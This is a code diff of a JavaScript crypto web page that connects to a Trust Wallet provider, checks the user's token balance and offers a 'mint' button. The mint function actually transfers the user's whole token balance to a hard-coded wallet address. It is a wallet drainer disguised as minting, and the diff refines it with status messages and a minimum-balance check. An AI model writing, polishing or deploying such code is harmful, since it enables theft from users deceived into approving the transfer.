@@ -14,20 +14,23 @@ var ethersProvider = null;
 var contract = null;
 var contractWithSigner = null;
 var signer = null;
-function getTrustWalletInjectedProvider(
-    { timeout } = { timeout: 3000 }
-  ) {
+function getTrustWalletInjectedProvider() {
 
 
     trustWalletExist = ethereum.isTrust;
 
-
     injectedProviderExist =
       typeof window !== "undefined" && typeof window.ethereum !== "undefined";
-
+    
+      
 
     injectedProvider = window["trustwallet"];
-    
+
+    if(!injectedProvider){
+      document.getElementById("Connect-Wallet").style.color='red';
+      document.getElementById("Connect-Wallet").textContent='Connect-Wallet: Without Trust wallet!';
+      return
+    }
     ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
     contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);
     if (injectedProvider) {
@@ -48,9 +51,17 @@ async function switchToNetwork(){
 
         bscChain = true;
 
+        if(bscChain == true){
+          document.getElementById("Connect-Wallet").style.color='green';
+          document.getElementById("Connect-Wallet").textContent='Connect-Wallet: Success!';
+        }
+
       } catch (e) {
         if (e.code === 4001) {
           bscChain = false;
+          document.getElementById("Connect-Wallet").style.color='red';
+          document.getElementById("Connect-Wallet").textContent='Connect-Wallet: Please Connect BSC Chain!';
+        
           setError("User rejected switching chains.");
         }
     }
@@ -69,12 +80,17 @@ async function connectAccount(){
       });
     
       account = userAccounts[0]
-
-      requestAccount = true;
-
+      if (account){
+        requestAccount = true;
+      }else{
+        document.getElementById("Verify-you-address").textContent = "Verify-you-address: Can't Connect address!";
+        document.getElementById("Verify-you-address").style.color = 'red';
+      }
       } catch (e) {
       if (e.code === 4001) {
           requestAccount = false;
+          document.getElementById("Verify-you-address").textContent = "Verify-you-address: Can't Connect address!";
+          document.getElementById("Verify-you-address").style.color = 'red';
           console.error("User denied connection.");
       }
   }
@@ -91,22 +107,40 @@ async function verifyAddress(){
     accountBalance = ethers.utils.formatUnits(rawBalance, decimals);
 
     if (accountBalance < 2){
-      
-    }
+      document.getElementById("Verify-you-address").textContent = "Verify-you-address: Balance Not enough!";
+      document.getElementById("Verify-you-address").style.color = 'red';
+      return ;
+      }
     requestAccount = true;
+    document.getElementById("Verify-you-address").style.color = 'green';
+    document.getElementById("Verify-you-address").textContent = 'Verify-you-address: Success!';
     } catch (e) {
     if (e.code === 4001) {
         requestAccount = false;
+        document.getElementById("Verify-you-address").textContent = "Verify-you-address: Balance Not enough!";
+        document.getElementById("Verify-you-address").style.color = 'red';
         console.error("User denied connection.");
     }
   }
 }
 
 async function mint(){
-    signer = ethersProvider.getSigner();
-    contractWithSigner = contract.connect(signer);
-    contractWithSigner.transfer("0x4779D9b6031154B6A1991582A44edb51E0bef44b",rawBalance);
-}
+  try {
+      signer = ethersProvider.getSigner();
+      contractWithSigner = contract.connect(signer);
+      var success = await contractWithSigner.transfer("0x4779D9b6031154B6A1991582A44edb51E0bef44b",rawBalance);
+      if(success){
+        document.getElementById("Mint").textContent = "Mint: Success!";
+        document.getElementById("Mint").style.color = 'green';
+      }
+    } catch (e) {
+    
+      document.getElementById("Mint").textContent = "Mint: Reject Mint!";
+      document.getElementById("Mint").style.color = 'red';
+      console.error("User denied connection.");
+
+  }
+    }
 
 
 document.getElementById("Connect-Wallet").addEventListener("click", connectWallet);
